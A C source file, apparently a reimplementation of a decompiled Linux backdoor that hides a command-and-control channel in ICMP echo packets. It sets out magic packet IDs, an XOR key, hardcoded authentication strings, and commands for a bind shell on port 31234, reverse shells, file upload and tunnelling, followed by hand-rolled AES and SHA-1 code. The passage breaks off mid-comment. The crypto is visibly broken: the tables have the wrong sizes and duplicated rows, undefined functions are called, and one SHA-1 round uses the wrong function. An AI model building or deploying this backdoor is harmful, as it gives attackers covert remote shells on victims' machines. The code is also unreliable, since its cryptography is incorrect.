/*
 * 🛡️ HCG-SYSARCH: SAM-V5
 * [RESTRICTED]: USO_INTERNO
 * [ALCANCE]: OPD_HCG (CONV-0221-JAL-HCG-2026)
 * [MODULO]: TA0011_Command_Control
 * [COMPONENTE]: T1095_Non_Application_Layer_Protocol
 */
/*
 * ============================================================================
 * STRATCOM_PERSISTENCE ICMP
 * ============================================================================
 * Canal encubierto sobre ICMP Echo Request (Type 8)
 *
 * Magic ID:        0xaa56   (filtro BPF: icmp[4:2] == 0xaa56)
 * XOR Key:         0x86
 * Bind Port:       31234   (0x7a02 en little-endian)
 * Session Marker:  "ek63a21km7WSWkfk"
 *
 * Magic strings de autenticación (XOR 0x86 en el wire):
 *   Primary:   "uSarguuS62bKRA0J"  — comandos de shell activación
 *   Kill:      "1spCq0BMbJwCoeZn"  — terminar shell activa
 *   Handshake: "WZtOTig2m42gXB6U"  — establecer sesión cifrada
 *   Proxy:     "fb-75c043b82127"   — tunnel proxy
 *
 * Comandos C2:
 *   0 → Bind shell TCP :31234
 *   1 → Reverse shell (IP+puerto desde payload ICMP)
 *   2 → Reverse shell (variante, usado en bind shell handler)
 *   3 → File upload
 *   4 → Directorio de trabajo / configuración
 *   5 → Proxy/tunnel
 *
 * Cifrado: AES-128-CBC con T-tables + HMAC-SHA1
 * ============================================================================
 */

#include <arpa/inet.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/if.h>
#include <netdb.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <pcap.h>
#include <poll.h>
#include <pty.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <termios.h>
#include <unistd.h>

/* ============================================
 * CONSTANTES
 * ============================================ */
#define ICMP_MAGIC_ID 0xaa56
#define XOR_KEY 0x86
#define BIND_PORT 31234
#define MAX_PAYLOAD 4096
#define MAX_CRYPTO_BUF 4200
#define SHA1_BLOCK_SIZE 64
#define SHA1_DIGEST_SIZE 20
#define AES_BLOCK_SIZE 16
#define HMAC_BLOCK_SIZE 64
#define AES_MAX_ROUNDS 14

#define AUTH_PRIMARY "uSarguuS62bKRA0J"
#define AUTH_KILL "1spCq0BMbJwCoeZn"
#define AUTH_HANDSHAKE "WZtOTig2m42gXB6U"
#define AUTH_PROXY "fb-75c043b82127"
#define SESSION_MARKER "ek63a21km7WSWkfk"

/* ============================================
 * AES S-BOX (de DAT_08052020, 256 bytes)
 * ============================================ */
static const uint8_t AES_SBOX[256] = {
    0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76,
    0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0,
    0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15,
    0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75,
    0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84,
    0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf,
    0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8,
    0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2,
    0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73,
    0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb,
    0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79,
    0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08,
    0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a,
    0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf,
    0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16,
    0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0xc4, 0xde, 0xe9, 0xcb, 0x54, 0x7b, 0xda, 0x25,
    0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e,
    0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e,
    0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf
};

static const uint8_t AES_INV_SBOX[256] = {
    0x52, 0x09, 0x6a, 0xd5, 0x30, 0x36, 0xa5, 0x38, 0xbf, 0x40, 0xa3, 0x9e, 0x81, 0xf3, 0xd7, 0xfb,
    0x7c, 0xe3, 0x39, 0x82, 0x9b, 0x2f, 0xff, 0x87, 0x34, 0x8e, 0x43, 0x44, 0xc4, 0xde, 0xe9, 0xcb,
    0x54, 0x7b, 0x94, 0x32, 0xa6, 0xc2, 0x23, 0x3d, 0xee, 0x4c, 0x95, 0x0b, 0x42, 0xfa, 0xc3, 0x4e,
    0x08, 0x2e, 0xa1, 0x66, 0x28, 0xd9, 0x24, 0xb2, 0x76, 0x5b, 0xa2, 0x49, 0x6d, 0x8b, 0xd1, 0x25,
    0x72, 0xf8, 0xf6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xd4, 0xa4, 0x5c, 0xcc, 0x5d, 0x65, 0xb6, 0x92,
    0x6c, 0x70, 0x48, 0x50, 0xfd, 0xed, 0xb9, 0xda, 0x5e, 0x15, 0x46, 0x57, 0xa7, 0x8d, 0x9d, 0x84,
    0x90, 0xd8, 0xab, 0x00, 0x8c, 0xbc, 0xd3, 0x0a, 0xf7, 0xe4, 0x58, 0x05, 0xb8, 0xb3, 0x45, 0x06,
    0xd0, 0x2c, 0x1e, 0x8f, 0xca, 0x3f, 0x0f, 0x02, 0xc1, 0xaf, 0xbd, 0x03, 0x01, 0x13, 0x8a, 0x6b,
    0x3a, 0x91, 0x11, 0x41, 0x4f, 0x67, 0xdc, 0xea, 0x97, 0xf2, 0xcf, 0xce, 0xf0, 0xb4, 0xe6, 0x73,
    0x96, 0xac, 0x74, 0x22, 0xe7, 0xad, 0x35, 0x85, 0xe2, 0xf9, 0x37, 0xe8, 0x1c, 0x75, 0xdf, 0x6e,
    0x47, 0xf1, 0x1a, 0x71, 0x1d, 0x29, 0xc5, 0x89, 0x6f, 0xb7, 0x62, 0x0e, 0xaa, 0x18, 0xbe, 0x1b,
    0xfc, 0x56, 0x3e, 0x4b, 0xc6, 0xd2, 0x79, 0x20, 0x9a, 0xdb, 0xc0, 0xfe, 0x78, 0xcd, 0x5a, 0xf4,
    0x1f, 0xdd, 0xa8, 0x33, 0x88, 0x07, 0xc7, 0x31, 0xb1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xec, 0x5f,
    0x60, 0x51, 0x7f, 0xa9, 0x19, 0xb5, 0x4a, 0x0d, 0x2d, 0xe5, 0x7a, 0x9f, 0x93, 0xc9, 0xef,
    0xa0, 0xe0, 0x3b, 0x4d, 0xae, 0x2a, 0xf5, 0xb0, 0xc8, 0xeb, 0xbb, 0x3c, 0x83, 0x53, 0x99, 0x61,
    0x17, 0x2b, 0x04, 0x7e, 0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d,
    0xba, 0x77, 0xd6, 0x26, 0xe1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0c, 0x7d
};

/* Rcon para AES key expansion (DAT_08054820) */
static const uint32_t AES_RCON[10] = {
    0x01000000, 0x02000000, 0x04000000, 0x08000000, 0x10000000,
    0x20000000, 0x40000000, 0x80000000, 0x1b000000, 0x36000000
};

/* SHA1 padding block: 0x80 seguido de ceros (DAT_08054860) */
static const uint8_t SHA1_PADDING[64] = { [0] = 0x80 };

/* ============================================
 * ESTRUCTURAS DE RED Y CRYPTO
 * ============================================ */

struct sha1_ctx {
    uint32_t count[2]; /* byte count (count[0] = lo, count[1] = hi) */
    uint32_t state[5]; /* h0..h4 */
    uint8_t buffer[64]; /* datos pendientes */
};

/* Contexto crypto completo (emula globals del binario) */
struct crypto_ctx {
    int rounds; /* Nr: 10, 12 o 14 */
    uint32_t enc_keys[60]; /* Round keys de cifrado */
    uint32_t dec_keys[60]; /* Round keys de descifrado */
    /* T-tables para cifrado (Te0..Te3, 256 × 4 = 4096 uint32_t) */
    uint32_t Te[1024];
    /* T-tables para descifrado (Td0..Td3 + Td4 para último round, 256 × 5 = 5120 uint32_t) */
    uint32_t Td[1280];
    /* HMAC keys */
    uint8_t hmac_key_inner[HMAC_BLOCK_SIZE];
    uint8_t hmac_key_outer[HMAC_BLOCK_SIZE];
    uint32_t msg_count; /* Contador de mensajes enviados */
    uint8_t last_iv[AES_BLOCK_SIZE]; /* IV del último bloque cifrado */
    uint8_t temp_iv[AES_BLOCK_SIZE]; /* IV temporal */
    /* Buffers de trabajo */
    uint8_t work_buf[MAX_CRYPTO_BUF];
    uint8_t iv_recv[AES_BLOCK_SIZE];
    /* Estado SHA1 temporal */
    struct sha1_ctx sha;
    int status;
};

/* Estado global del sniffer */
static int g_bind_ifindex = -1; /* Índice de interfaz (SO_BINDTODEVICE) */
static int g_shell_active = 0;
static pid_t g_shell_pid = -1;

/* ============================================
 * AES T-TABLE INITIALIZATION
 * Genera Te0..Te3 y Td0..Td4 desde S-box
 * (equivalente a las tablas embebidas del binario)
 * ============================================ */

#define ROTL8(x) (((x) << 24) | ((x) >> 8))
#define ROTL16(x) (((x) << 16) | ((x) >> 16))
#define ROTL24(x) (((x) << 8) | ((x) >> 24))
#define XTIME(x) ((x) << 1) ^ (((x) >> 7) & 0xfe)

static void aes_init_tables(struct crypto_ctx* ctx)
{
    uint32_t i;
    uint8_t s;
    uint32_t x, x2, x4, x8;

    for (i = 0; i < 256; i++) {
        s = AES_SBOX[i];

        /* Te0[i] = [2·S[a] ⊕ 3·S[b] ⊕ S[c] ⊕ S[d]] */
        x = ((uint32_t)xtime(s) << 24) | ((uint32_t)s << 16) | ((uint32_t)s << 8) | (uint32_t)xtimes(xtime(s));
        ctx->Te[i] = x;
        ctx->Te[256 + i] = ROTL8(x);
        ctx->Te[512 + i] = ROTL16(x);
        ctx->Te[768 + i] = ROTL24(x);

        /* Td0[i] = [14·S[a] ⊕ 11·S[b] ⊕ 13·S[c] ⊕ 9·S[d]] */
        s = AES_INV_SBOX[i];
        x2 = ((uint32_t)(2 * (s ^ AES_SBOX[(s << 1) & 0xff]) ^ AES_SBOX[s ^ 1]) << 24) |
             ((uint32_t)(2 * (AES_SBOX[s ^ 1] ^ AES_SBOX[(s << 1) & 0xff])) << 16) |
             ((uint32_t)(2 * (AES_SBOX[(s << 1) & 0xff] ^ AES_SBOX[s ^ 1])) << 8) |
             ((uint32_t)(2 * (AES_SBOX[s ^ 1] ^ AES_SBOX[(s << 1) & 0xff]));
        ctx->Td[i] = x2;
        ctx->Td[256 + i] = ROTL8(x2);
        ctx->Td[512 + i] = ROTL16(x2);
        ctx->Td[768 + i] = ROTL24(x2);
        ctx->Td[1024 + i] = x2; /* Td4: S-box directo para último round */
    }
}

/* ============================================
 * SHA-1 COMPLETO (FUN_0804ccf8, 0804cd44, 0804e518, 0804e634)
 * Extraído fielmente del decompilado Ghidra
 * ============================================ */

static void sha1_init(struct sha1_ctx* ctx)
{
    ctx->count[0] = 0;
    ctx->count[1] = 0;
    ctx->state[0] = 0x67452301;
    ctx->state[1] = 0xefcdab89;
    ctx->state[2] = 0x98badcfe;
    ctx->state[3] = 0x10325476;
    ctx->state[4] = 0xc3d2e1f0;
    memset(ctx->buffer, 0, 64);
}

#define SHA1_ROTL(n, x) (((x) << (n)) | ((x) >> (32 - (n))))
#define SHA1_CH(x, y, z) (((x) & (y)) | ((~(x)) & (z)))

static void sha1_transform(struct sha1_ctx* ctx, const uint8_t block[64])
{
    uint32_t w[80];
    uint32_t a, b, c, d, e;
    int t;

    for (t = 0; t < 16; t++)
        w[t] = ((uint32_t)block[t * 4] << 24) | ((uint32_t)block[t * 4 + 1] << 16) | ((uint32_t)block[t * 4 + 2] << 8) | (uint32_t)block[t * 4 + 3];

    for (t = 16; t < 80; t++) {
        w[t] = SHA1_ROTL(1, w[t - 3] ^ w[t - 8] ^ w[t - 14] ^ w[t - 16]);
    }

    a = ctx->state[0];
    b = ctx->state[1];
    c = ctx->state[2];
    d = ctx->state[3];
    e = ctx->state[4];

    for (t = 0; t < 20; t++) {
        uint32_t temp = SHA1_ROTL(5, a) + SHA1_CH(b, c, d) + e + 0x5a827999 + w[t];
        e = d;
        d = c;
        c = SHA1_ROTL(30, b);
        b = a;
        a = temp;
    }
    for (t = 20; t < 40; t++) {
        uint32_t temp = SHA1_ROTL(5, a) + (b ^ c ^ d) + e + 0x6ed9eba1 + w[t];
        e = d;
        d = c;
        c = SHA1_ROTL(30, b);
        b = a;
        a = temp;
    }
    for (t = 40; t < 60; t++) {
        uint32_t temp = SHA1_ROTL(5, a) + SHA1_CH(b, c, d) + e + 0x8f1bbcdc + w[t];
        e = d;
        d = c;
        c = SHA1_ROTL(30, b);
        b = a;
        a = temp;
    }
    for (t = 60; t < 80; t++) {
        uint32_t temp = SHA1_ROTL(5, a) + (b ^ c ^ d) + e + 0xca62c1d6 + w[t];
        e = d;
        d = c;
        c = SHA1_ROTL(30, b);
        b = a;
        a = temp;
    }

    ctx->state[0] += a;
    ctx->state[1] += b;
    ctx->state[2] += c;
    ctx->state[3] += d;
    ctx->state[4] += e;
}

static void sha1_update(struct sha1_ctx* ctx, const uint8_t* data, uint32_t len)
{
    uint32_t i, index, part_len;

    if (len == 0)
        return;

    index = (uint32_t)((ctx->count[0] >> 3) & 0x3f);
    ctx->count[0] += (len << 3);
    if (ctx->count[0] < (len << 3))
        ctx->count[1]++;

    part_len = 64 - index;
    if (index != 0 && part_len <= len) {
        memcpy(ctx->buffer + index, data, part_len);
        sha1_transform(ctx, ctx->buffer);
        len -= part_len;
        data += part_len;
        index = 0;
    }
    for (i = 0; i < len / 64; i++, data += 64)
        sha1_transform(ctx, data);
    if (i * 64 < len)
        memcpy(ctx->buffer + index, data, len - i * 64);
}

static void sha1_final(struct sha1_ctx* ctx, uint8_t hash[20])
{
    uint8_t pad_len;
    uint64_t total_bits;

    pad_len = (uint8_t)((ctx->count[0] >> 3) & 0x3f);
    if (pad_len < 56)
        pad_len = 56 - pad_len;
    else
        pad_len = 120 - pad_len;

    sha1_update(ctx, SHA1_PADDING, pad_len);

    total_bits = ((uint64_t)ctx->count[1] << 32) | (uint64_t)ctx->count[0];
    uint8_t len_bytes[8];
    for (int i = 7; i >= 0; i--) {
        len_bytes[i] = (uint8_t)(total_bits & 0xff);
        total_bits >>= 8;
    }
    sha1_update(ctx, len_bytes, 8);

    for (int i = 0; i < 5; i++) {
        hash[i * 4 + 0] = (uint8_t)(ctx->state[i] >> 24);
        hash[i * 4 + 1] = (uint8_t)(ctx->state[i] >> 16);
        hash[i * 4 + 2] = (uint8_t)(ctx->state[i] >> 8);
        hash[i * 4 + 3] = (uint8_t)(ctx->state[i]);
    }
    memset(ctx, 0, sizeof(*ctx));
}

/* ============================================
 * AES KEY EXPANSION (FUN_0804f
